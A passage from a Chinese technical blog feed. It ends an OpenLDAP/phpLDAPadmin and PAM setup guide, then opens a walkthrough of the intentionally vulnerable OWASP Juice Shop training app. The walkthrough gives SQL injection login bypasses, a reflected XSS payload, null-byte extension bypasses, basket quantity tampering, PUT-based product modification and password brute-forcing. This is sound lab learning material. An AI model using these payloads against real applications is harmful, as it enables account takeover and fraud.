</figure><blockquote><p>如果熟悉配置，可以使用更轻量级的工具LDAP admin</p></blockquote><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://mmbiz.qpic.cn/mmbiz_png/AtP0DxfwGB7E42KCOhKuqQVhpZDTib0eRVxCeQy8YibvkpMcicTqxzeBhupSP5eSqibWfEiazrsVjiaDFUfKV83qeuvw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="PhpLdapAdmin"><a href="#PhpLdapAdmin" class="headerlink" title="PhpLdapAdmin"></a>PhpLdapAdmin</h3><pre><code class="bash">yum -y install epel-releaseyum -y install httpdyum -y install phpldapadminvim /etc/httpd/conf.d/phpldapadmin.confAlias /phpldapadmin /usr/share/phpldapadmin/htdocsAlias /ldapadmin /usr/share/phpldapadmin/htdocs&lt;Directory /usr/share/phpldapadmin/htdocs&gt;  &lt;IfModule mod_authz_core.c&gt;    # Apache 2.4    Require all granted    Allow from all  &lt;/IfModule&gt;  &lt;IfModule !mod_authz_core.c&gt;    # Apache 2.2    Order Deny,Allow    Allow from all  &lt;/IfModule&gt;&lt;/Directory&gt;vim /etc/phpldapadmin/config.php # 去掉注释 并注释原来的配置$servers-&gt;setValue(&#39;login&#39;,&#39;attr&#39;,&#39;dn&#39;);//$servers-&gt;setValue(&#39;login&#39;,&#39;attr&#39;,&#39;uid&#39;);#重启服务systemctl restart httpd</code></pre><p>访问 <a href="http://ip/ldapadmin，点击登陆。CN填写域信息`cn=admin,dc=sys,dc=com`，密码填写自己设置的密码。" target="_blank" rel="noopener">http://ip/ldapadmin，点击登陆。CN填写域信息`cn=admin,dc=sys,dc=com`，密码填写自己设置的密码。</a></p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ol><li>在ldapadmin管理中添加用户注意配置shell，默认为nologin</li><li>yum安装的版本会出现展示信息过少和password_hash问题，问题详情可见：  <a href="https://sourceforge.net/u/nihilisticz/phpldapadmin/ci/7e53dab990748c546b79f0610c3a7a58431e9ebc/#diff-1" target="_blank" rel="noopener">https://sourceforge.net/u/nihilisticz/phpldapadmin/ci/7e53dab990748c546b79f0610c3a7a58431e9ebc/#diff-1</a> ，建议下载最新版编译安装</li></ol><h3 id="LDAP客户端"><a href="#LDAP客户端" class="headerlink" title="LDAP客户端"></a>LDAP客户端</h3><p>sed可能无法成功替换，因为空格个数不定，需要自行手工检查</p><pre><code class="bash"># CentOS 7yum -y install openldap-clients nss-pam-ldapd sed -i &#39;s/passwd:    files/passwd:\tfiles ldap/g&#39;  /etc/nsswitch.confsed -i &#39;s/group:     files/group:     files ldap/g&#39;  /etc/nsswitch.confsed -i &#39;s/shadow:    files/shadow:     files ldap/g&#39;  /etc/nsswitch.confsystemctl restart nscdsystemctl restart nslcdauthconfig --enableldap --enableldapauth --ldapserver=ldap://192.168.209.139:389 --ldapbasedn=&quot;dc=sys,dc=com&quot; --enablemkhomedir --updatechkconfig nscd onchkconfig nslcd onsed -i &#39;s/UID_MAX   60000/UID_MAX       10000/g&#39;   /etc/login.defssed -i &#39;s/GID_MAX   60000/GID_MAX       10000/g&#39;   /etc/login.defs# 修改PAM认证mv /etc/pam.d/system-auth /etc/pam.d/system-auth.bakmv /etc/pam.d/password-auth  /etc/pam.d/password-auth.bakcat &gt;&gt; /etc/pam.d/system-auth &lt;&lt; EOF#%PAM-1.0# This file is auto-generated.# User changes will be destroyed the next time authconfig is run.auth        required      pam_env.soauth        sufficient    pam_fprintd.soauth        sufficient    pam_unix.so nullok try_first_passauth        requisite     pam_succeed_if.so uid &gt;= 500 quietauth        sufficient    pam_ldap.so use_first_passauth        required      pam_deny.soaccount     required      pam_unix.so broken_shadowaccount     sufficient    pam_localuser.soaccount     sufficient    pam_succeed_if.so uid &lt; 500 quietaccount     [default=bad success=ok user_unknown=ignore] pam_ldap.soaccount     required      pam_permit.sopassword    requisite     pam_cracklib.so try_first_pass retry=3 type=password    sufficient    pam_unix.so md5 shadow nullok try_first_pass use_authtokpassword    sufficient    pam_ldap.so use_authtokpassword    required      pam_deny.sosession     optional      pam_keyinit.so revokesession     required      pam_limits.sosession     optional      pam_oddjob_mkhomedir.so skel=/etc/skel umask=0077session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uidsession     required      pam_unix.sosession     optional      pam_ldap.soEOFcat &gt;&gt;  /etc/pam.d/password-auth &lt;&lt; EOF#%PAM-1.0# This file is auto-generated.# User changes will be destroyed the next time authconfig is run.auth        required      pam_env.soauth        sufficient    pam_unix.so nullok try_first_passauth        requisite     pam_succeed_if.so uid &gt;= 500 quietauth        sufficient    pam_ldap.so use_first_passauth        required      pam_deny.soaccount     required      pam_unix.so broken_shadowaccount     sufficient    pam_localuser.soaccount     sufficient    pam_succeed_if.so uid &lt; 500 quietaccount     [default=bad success=ok user_unknown=ignore] pam_ldap.soaccount     required      pam_permit.sopassword    requisite     pam_cracklib.so try_first_pass retry=3 type=password    sufficient    pam_unix.so md5 shadow nullok try_first_pass use_authtokpassword    sufficient    pam_ldap.so use_authtokpassword    required      pam_deny.sosession     optional      pam_keyinit.so revokesession     required      pam_limits.sosession     optional      pam_oddjob_mkhomedir.so skel=/etc/skel umask=0077session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uidsession     required      pam_unix.sosession     optional      pam_ldap.soEOFecho &quot;AllowGroups root sysadmin&quot; &gt;&gt; /etc/ssh/sshd_configsystemctl restart sshd</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMTY4ODA5NA==&amp;mid=2247483901&amp;idx=1&amp;sn=20c3b35774dc30577738bf6baabe9f61&amp;chksm=9ad4968cada31f9a0dfa16555afc58f3aa62506511ca5e3862542f803f8e49f38d2607b9f0cd&amp;mpshare=1&amp;scene=24&amp;srcid=0327J0ypWyirZErxB35h41Zi#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMTY4ODA5NA==&amp;mid=2247483901&amp;idx=1&amp;sn=20c3b35774dc30577738bf6baabe9f61&amp;chksm=9ad4968cada31f9a0dfa16555afc58f3aa62506511ca5e3862542f803f8e49f38d2607b9f0cd&amp;mpshare=1&amp;scene=24&amp;srcid=0327J0ypWyirZErxB35h41Zi#rd</a></p></li><li><p><a href="http://www.openldap.org/doc/admin24/quickstart.html" target="_blank" rel="noopener">http://www.openldap.org/doc/admin24/quickstart.html</a></p></li><li><p><a href="http://www.cnblogs.com/netonline/p/7486832.html" target="_blank" rel="noopener">http://www.cnblogs.com/netonline/p/7486832.html</a></p></li><li><p><a href="http://blog.sina.com.cn/s/blog_8ea8e9d50102wul5.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_8ea8e9d50102wul5.html</a></p></li><li><p><a href="https://www.ibm.com/developerworks/cn/linux/1406_liulz_pamopenldap/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/1406_liulz_pamopenldap/</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1026304" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1026304</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Juice Shop靶场writeup</title>
      <link href="20180319/OWASP%20Juice%20Shop%20writeup.html"/>
      <url>20180319/OWASP%20Juice%20Shop%20writeup.html</url>
      
        <content type="html"><![CDATA[<p>近日在OWASP官网发现了这个靶场，融入了OWASP TOP10的漏洞，感觉好像很好玩，花了好几天的时间自己快速地过了一遍。该WP基于 Juice shop v7.0.2（18年版本）。左上可以点开目录，点击直达。</p><a id="more"></a><p>有人说为啥网上writeup都有了要看你的？因为很多wp说的都不清晰不全，大部分还是英文，我在写wp的时候会尽量把知识点写得更清晰，其次，这个靶场更新很快，很多新题目网上都没有wp，我也尽量给上自己的思路和理解。欢迎提出修改意见~</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方的Github源码链接为 <a href="https://github.com/bkimminich/juice-shop/" target="_blank" rel="noopener">https://github.com/bkimminich/juice-shop/</a></p><h3 id="源码NPM安装"><a href="#源码NPM安装" class="headerlink" title="源码NPM安装"></a>源码NPM安装</h3><p>注意 Node8 和 Node9 有所不同，具体可见github的安装指南。以下是9的安装步骤</p><ol><li>安装 <a href="#nodejs-version-compatibility">node.js</a></li><li>下载源码 <code>git clone https://github.com/bkimminich/juice-shop.git</code></li><li><code>cd juice-shop</code></li><li><code>npm install</code></li><li>运行 <code>npm start</code></li><li>访问 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a> 即可。如果需要</li></ol><h3 id="Docker安装（推荐）"><a href="#Docker安装（推荐）" class="headerlink" title="Docker安装（推荐）"></a>Docker安装（推荐）</h3><p>之所以推荐这个是因为挂掉了或者是重新开始也能很快地搭建环境。docker使用非常简单：</p><ol><li>安装 <a href="https://www.docker.com" target="_blank" rel="noopener">Docker</a></li><li>拉取镜像 <code>docker pull bkimminich/juice-shop</code></li><li>运行容器 <code>docker run -d -p 3000:3000 bkimminich/juice-shop</code></li><li>访问 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a> （遇到问题可以到Github上面看看安装指南）</li></ol><h2 id="一星难度"><a href="#一星难度" class="headerlink" title="一星难度"></a>一星难度</h2><h3 id="Score-Board-计分板"><a href="#Score-Board-计分板" class="headerlink" title="Score Board 计分板"></a>Score Board 计分板</h3><blockquote><p>Find the carefully hidden ‘Score Board’ page.找到仔细隐藏的“评分板”页面</p></blockquote><p>对于新手来说，根据这个页面可以让自己有目标地进行挖洞，也是让自己有成就感的一种方式。:&gt; </p><p>接下来gogogo：</p><p>在首页源代码发现了注释的一块代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad8767c8c187.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>访问该页面 <code>/#/score-board</code> 会跳到计分板，里面有各个难度的说明</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad876adaed5f.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Admin-Section-管理员页面"><a href="#Admin-Section-管理员页面" class="headerlink" title="Admin Section 管理员页面"></a>Admin Section 管理员页面</h3><blockquote><p>Access the administration section of the store. 访问商店的管理页面。</p></blockquote><p>找到后台管理页面。御剑走一波扫不出来，根据描述猜解访问了 <a href="http://192.168.209.146:3000/administration" target="_blank" rel="noopener">http://192.168.209.146:3000/administration</a>，结果发现不行，重新输入 <a href="http://192.168.209.146:3000/#/administration" target="_blank" rel="noopener">http://192.168.209.146:3000/#/administration</a> 访问成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad87cb205097.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>结果完成了两个（挠头）</p><h3 id="Confidential-Document-机密文件"><a href="#Confidential-Document-机密文件" class="headerlink" title="Confidential Document 机密文件"></a>Confidential Document 机密文件</h3><blockquote><p>Access a confidential document. 访问机密文件</p></blockquote><p>看到这个一开始不知道哪儿有，搁置了一边之后在中途看到了这个链接：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad883f7cc1dd.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可能是因为中文的原因，这一行真的太明显了吧。。点开链接 <a href="http://192.168.209.146:3000/ftp/legal.md?md_debug=true" target="_blank" rel="noopener">http://192.168.209.146:3000/ftp/legal.md?md_debug=true</a></p><p>访问<a href="http://192.168.209.146:3000/ftp" target="_blank" rel="noopener">http://192.168.209.146:3000/ftp</a> 发现可以直接访问其ftp目录</p><p>点开一些文件提示<code>403 Error: Only .md and .pdf files are allowed!</code>，这个点是访问了第一个md文件就可以过了。此处还发现了一些bak文件，这个漏洞下面会说到</p><h3 id="Error-Handling-错误处理"><a href="#Error-Handling-错误处理" class="headerlink" title="Error Handling 错误处理"></a>Error Handling 错误处理</h3><blockquote><p>Provoke an error that is not very gracefully handled. 提出一个不太适合处理的错误。</p></blockquote><p>题目的意思是寻找出报错页面，由于上面莫名其妙完成了有点不知所以，docker重置了一波环境，在登录处看到了报错：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad8817c6de94.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>报错后即可完成</p><h3 id="Redirects-Tier-1-重定向第一关"><a href="#Redirects-Tier-1-重定向第一关" class="headerlink" title="Redirects Tier 1 重定向第一关"></a>Redirects Tier 1 重定向第一关</h3><blockquote><p>Let us redirect you to a donation site that went out of business. 让我们将您重定向至停业的捐赠网站。</p></blockquote><p>后续测试过程在购物车页面找到注释的重定向网址，实在是太猥琐了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad890db82b82.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="XSS-Tier-1-XSS第一关"><a href="#XSS-Tier-1-XSS第一关" class="headerlink" title="XSS Tier 1 XSS第一关"></a>XSS Tier 1 XSS第一关</h3><blockquote><p>Perform a reflected XSS attack with <script>alert("XSS")</script>. 执行反射 XSS攻击<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>。</p></blockquote><p>搜索框直接可以弹，闭合了反而没有提示完成，略坑=。=</p><h3 id="Zero-Stars-零星评价"><a href="#Zero-Stars-零星评价" class="headerlink" title="Zero Stars 零星评价"></a>Zero Stars 零星评价</h3><blockquote><p>Give a devastating zero-star feedback to the store. 给商店带来毁灭性的零星反馈。</p></blockquote><p>评价链接位于 联系我们 <a href="http://192.168.209.146:3001/#/contact" target="_blank" rel="noopener">http://192.168.209.146:3001/#/contact</a>，burp改包可过</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad8869a7526d.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="二星难度"><a href="#二星难度" class="headerlink" title="二星难度"></a>二星难度</h2><h3 id="Basket-Access-购物车访问"><a href="#Basket-Access-购物车访问" class="headerlink" title="Basket Access 购物车访问"></a>Basket Access 购物车访问</h3><blockquote><p>Access someone else’s basket. 访问他人的购物车</p></blockquote><p>修改会话存储的bid，访问购物车即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad895e3ca579.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Christmas-Special-圣诞特别礼"><a href="#Christmas-Special-圣诞特别礼" class="headerlink" title="Christmas Special 圣诞特别礼"></a>Christmas Special 圣诞特别礼</h3><blockquote><p>Order the Christmas special offer of 2014. 订购2014年的圣诞特供</p></blockquote><p>搜索框SQL注入。抓包回显了报错语句，明显有SQL注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/19/5ad899a85c484.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>分析语句，构造payload为<code>q=&#39;))--</code>可以查询出所有商品，添加2014的圣诞特供商品即可</p><h3 id="Deprecated-Interface-已弃用的接口"><a href="#Deprecated-Interface-已弃用的接口" class="headerlink" title="Deprecated Interface 已弃用的接口"></a>Deprecated Interface 已弃用的接口</h3><blockquote><p>Use a deprecated B2B interface that was not properly shut down.  使用未正确关闭的废弃的B2B接口。</p></blockquote><p>B2B接口不清楚是什么，但是在<a href="http://192.168.209.146:3001/#/complain" target="_blank" rel="noopener">http://192.168.209.146:3001/#/complain</a>页面中有一段注释掉的代码写着B2B，这个地方也可以上传xml文件，但是限定了只能从电脑选择pdf文件。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9d03574136.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9d1671217e.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>然而还是可以选xml文件进行上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9d2d2a35c7.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>上传后返回了<code>410</code>状态码，但是挑战也成功了。</p><blockquote><p>410：被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。</p></blockquote><h3 id="Five-Star-Feedback-五星级的反馈"><a href="#Five-Star-Feedback-五星级的反馈" class="headerlink" title="Five-Star Feedback 五星级的反馈"></a>Five-Star Feedback 五星级的反馈</h3><blockquote><p>Get rid of all 5-star customer feedback. 删掉所有的5星客户评价</p></blockquote><p>在<a href="http://192.168.209.146:3000/#/administration" target="_blank" rel="noopener">http://192.168.209.146:3000/#/administration</a>页面上，修改bid为1，即可删除</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad99ac091821.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Login-Admin-登陆Admin"><a href="#Login-Admin-登陆Admin" class="headerlink" title="Login Admin 登陆Admin"></a>Login Admin 登陆Admin</h3><blockquote><p>Log in with the administrator’s user account. 使用管理员用户账号登陆</p></blockquote><p>只能是sql注入了。回到登陆框，抓包看到提交的数据为<code>{&quot;email&quot;:&quot;\&quot; or 1=1--&quot;,&quot;password&quot;:&quot;123&quot;}</code>，结合sql语句 <code>SELECT * FROM Users WHERE email = &#39;1&#39;&#39; AND password = &#39;202cb962ac59075b964b07152d234b70</code>，payload为 <code>email&quot;:&quot;&#39; or 1=1 --&quot;,&quot;password&quot;:&quot;123&quot;</code>即可使用管理员登陆。原因是管理员的数据在select结果处于第一位。</p><h3 id="Login-MC-SafeSearch-登陆MC-SafeSearch"><a href="#Login-MC-SafeSearch-登陆MC-SafeSearch" class="headerlink" title="Login MC SafeSearch 登陆MC SafeSearch"></a>Login MC SafeSearch 登陆MC SafeSearch</h3><blockquote><p>Log in with MC SafeSearch’s original user credentials without applying SQL Injection or any other bypass. 使用MC SafeSearch的原始用户凭据登录，无需应用SQL注入或任何其他旁路。</p></blockquote><p>一开始以为是注入，但是题目写了不用注入，最后我也没想到是社工，搜索了一波才知道。</p><p>首先有sql注入的话用户都可以枚举，我手动测试了一下，发现<code>{&quot;email&quot;:&quot;&#39; or 1=1 limit 7,1 --&quot;,&quot;password&quot;:&quot;123&quot;}</code> 就是MC SafeSearch的邮箱 <code>mc.safesearch@juice-sh.op</code>，使用该payload。</p><p>谷歌搜索 MC SafeSearch ，发现一个Rapper唱的关于密码强度的MV</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9b4e9c53fc.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>播放视频开始切克闹，发现关键信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9b543373eb.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>于 <a href="https://www.youtube.com/watch?v=v59CX2DiX0Y" target="_blank" rel="noopener">视频 0:25</a> 表示了使用宠物的名字 <code>Mr.Noodles</code>作为密码，然后将一些字母变成了0，一般习惯是将 o 变成 0，所以密码就是 <code>Mr. N00dles</code>。坑点之处在密码中间要加空格，令人头大。</p><h3 id="Password-Strength-密码强度"><a href="#Password-Strength-密码强度" class="headerlink" title="Password Strength 密码强度"></a>Password Strength 密码强度</h3><blockquote><p>Log in with the administrator’s user credentials without previously changing them or applying SQL Injection. 使用管理员的用户凭证登录，而不必事先更改或应用SQL注入。</p></blockquote><p>题目是密码强度，考察点是弱密码。购物篮中有管理员邮箱<code>admin@juice-sh.op</code>，使用burp爆破即可，注意爆破速度不要过快，很容易扫挂掉</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9b28d7e179.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Weird-Crypto-奇怪的加密"><a href="#Weird-Crypto-奇怪的加密" class="headerlink" title="Weird Crypto 奇怪的加密"></a>Weird Crypto 奇怪的加密</h3><blockquote><p>Inform the shop about an algorithm or library it should definitely not use the way it does. 告知商店一个算法或库，它绝对不应该使用它的方式。</p></blockquote><p>在 <a href="http://192.168.209.146:3000/#/contact" target="_blank" rel="noopener">http://192.168.209.146:3000/#/contact</a> 提交一个不安全的算法。<br>这个答案一共有5个：z85 base85 base64 md5 hashid ，提交一个即可。</p><ul><li>md5: 数据库里面的密码是md5</li><li>base64: google accounts注册时密码用的b64传输</li><li>z85/hashid/base85: 六星难度题目出现的算法，后边会讲到</li></ul><h2 id="三星难度"><a href="#三星难度" class="headerlink" title="三星难度"></a>三星难度</h2><h3 id="Blockchain-Tier-1-区块链第一关"><a href="#Blockchain-Tier-1-区块链第一关" class="headerlink" title="Blockchain Tier 1 区块链第一关"></a>Blockchain Tier 1 区块链第一关</h3><blockquote><p>Learn about the Token Sale before its official announcement. 在官方宣布前了解一下Token销售</p></blockquote><p>看到题目一怔，是跟区块链比特币有关呢，仔细看了几遍hint。。这个题目暂时搁置了一会儿。</p><p>后续在做其他题目的时候看到了 <a href="http://192.168.209.146:3001/dist/juice-shop.min.js" target="_blank" rel="noopener">http://192.168.209.146:3001/dist/juice-shop.min.js</a> 这个js文件，搜索<code>token</code>发现里面存在题干关键的<code>Token Sale</code>这个词。关键代码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adadb71ac0a1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>粘贴这段代码到控制台运行一波</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adae1d19cc03.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>访问这个地址就完成题目了，这道题的意思应该是掩饰了一下地址吧，没太懂</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adadc4fc9bfc.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这个地址里面有一些关于区块链ICO白皮书之类的东西，看到这个调侃笑死我了哈哈哈</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adae376dd0d5.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Forged-Feedback-伪造反馈"><a href="#Forged-Feedback-伪造反馈" class="headerlink" title="Forged Feedback 伪造反馈"></a>Forged Feedback 伪造反馈</h3><blockquote><p>Post some feedback in another users name. 用其他人的用户提交反馈</p></blockquote><p>在<a href="http://192.168.209.146:3001/#/contact" target="_blank" rel="noopener">http://192.168.209.146:3001/#/contact</a>中提交评价的时候抓包改包，将<code>UserId</code>改成其它即可。</p><h3 id="Forgotten-Sales-Backup-被遗忘的销售备份"><a href="#Forgotten-Sales-Backup-被遗忘的销售备份" class="headerlink" title="Forgotten Sales Backup 被遗忘的销售备份"></a>Forgotten Sales Backup 被遗忘的销售备份</h3><blockquote><p>Access a salesman’s forgotten backup file. 进入到售货员遗忘的备份文件</p></blockquote><p>在第一关的 <code>Confidential Document 机密文件</code>题目中找到了一个ftp目录，并且该目录限定了只能查看 md 和 pdf 后缀的文件，在这里可以使用%00截断判断下载文件。其他文件同理。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9dade1ece9.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Login-Bender-登录Bender"><a href="#Login-Bender-登录Bender" class="headerlink" title="Login Bender 登录Bender"></a>Login Bender 登录Bender</h3><blockquote><p>Log in with Bender’s user account.</p></blockquote><p>利用SQL注入即可，payload 为<code>email&quot;:&quot;&#39; or 1=1 limit 5,1 --&quot;,&quot;password&quot;:&quot;123</code> ，修改limit的序列即可</p><h3 id="Login-Jim-登录Jim"><a href="#Login-Jim-登录Jim" class="headerlink" title="Login Jim 登录Jim"></a>Login Jim 登录Jim</h3><blockquote><p>Log in with Jim’s user account.</p></blockquote><p>同上</p><h3 id="Payback-Time-投资回收期"><a href="#Payback-Time-投资回收期" class="headerlink" title="Payback Time 投资回收期"></a>Payback Time 投资回收期</h3><blockquote><p>Place an order that makes you rich. 下一个令你富有的订单。</p></blockquote><p>商品加车漏洞。添加购物车的时候抓包，修改POST数据 <code>{&quot;ProductId&quot;:8,&quot;BasketId&quot;:&quot;10&quot;,&quot;quantity&quot;:1}</code> 中的quantity为负数，加车后结账金额为负数。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9ebf05e0f5.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="Product-Tampering-商品篡改"><a href="#Product-Tampering-商品篡改" class="headerlink" title="Product Tampering 商品篡改"></a>Product Tampering 商品篡改</h3><blockquote><p>Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into <a href="http://kimminich.de" target="_blank" rel="noopener">http://kimminich.de</a>. 将owasp ssl高级取证工具（o-saft）产品描述中的链接的href更改为<a href="http://kimminich.de。" target="_blank" rel="noopener">http://kimminich.de。</a></p></blockquote><p>要改产品描述。访问首页，点击一个商品，在Chrome里面选择XHR请求，有几个个API接口，其中有一个包含描述信息的链接如下</p><p><a href="http://192.168.209.146:3001/api/Products/1?d=Fri%20Apr%2020%202018" target="_blank" rel="noopener">http://192.168.209.146:3001/api/Products/1?d=Fri%20Apr%2020%202018</a> d后面跟的是时间参数，不加的话好像是返回最新修改日期</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9f43feedfd.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>如果API接口使用了PUT或者DELETE这些危险的HTTP方法的话，数据就很容易被修改。这里试了一下PUT请求，结果是可以搞定的。使用火狐插件 RESTclient ，记得加HTTP头指定类型为 json ，注意要使用<code>{&quot;description&quot;: &quot;TEST&quot;}</code>而不能是<code>{&quot;data&quot;:{&quot;description&quot;: &quot;TEST&quot;}}</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/20/5ad9f5aa365ff.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>所以最后的payload为<code>{&quot;description&quot;: &quot;&lt;a href=\&quot;http://kimminich.de\&quot;&gt;&lt;/a&gt;&quot;}</code></p><h3 id="Reset-Jim’s-Password-重置Jim的密码"><a href="#Reset-Jim’s-Password-重置Jim的密码" class="headerlink" title="Reset Jim’s Password 重置Jim的密码"></a>Reset Jim’s Password 重置Jim的密码</h3><blockquote><p>Reset Jim’s password via the Forgot Password mechanism with the original answer to his security question. 通过忘记密码来重置Jim的密码，要求回答他的安全问题</p></blockquote><p>首先通过登陆的SQL注入<code>{&quot;email&quot;:&quot;&#39; or 1=1 limit 1,1 --&quot;,&quot;password&quot;:&quot;123&quot;}</code>搞到邮箱号， <a href="mailto:jim@juice-sh.op" target="_blank" rel="noopener">jim@juice-sh.op</a>。问的安全问题是<code>Your eldest siblings middle name?</code>，这道题没法儿社工啊。</p><p>这道题懵逼了，查了别人的解题说是美国的社工？提到JIM会想起 <em>James T. Kirk</em> ？反正我搜JIM只能搜到 <em>Jim Parsons</em> ( <em>Sheldon</em> 扮演者233)</p><p>所以正确的解答路径是</p><ol><li>想到 <em>James_T._Kirk</em> ，到Wiki上搜他<a href="https://en.wikipedia.org/wiki/James_T._Kirk" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/James_T._Kirk</a></li><li>上面写着Jim有个Brother叫 <em>George Samuel Kirk</em></li><li>所以安全问题的答案就是 <em>Samuel</em></li><li>重置密码，收工。</li></ol><h3 id="Upload-Size-amp-Upload-Type"><a href="#Upload-Size-amp-Upload-Type" class="headerlink" title="Upload Size &amp; Upload Type"></a>Upload Size &amp; Upload Type</h3><blockquote><p>Upload a file larger than 100 kB.Upload a file that has no .pdf extension. 上传一个文件大于100kb，上传一个文件不用pdf扩展名</p></blockquote><p>两道题在一块儿写。文件上传跟前面说到的上传XML是同一个点，位于投诉页面。尝试提交，查看XHR请求，很明显有个接口 <a href="http://192.168.209.146:3001/file-upload" target="_blank" rel="noopener">http://192.168.209.146:3001/file-upload</a> 是用于文件上传的。</p><p>此处先用burp截断，点击上传，提示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adaa13d69345.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>burp处没有收到请求，说明是前端校验，因此用改包、写脚本等方法直接post到上传接口处即可。</p><p>扩展名绕过可以用<code>%2500</code>截断，也可以用如上的方法。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/04/21/5adaa0e536f6e.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="XSS-Tier-2-XSS第二关"><a 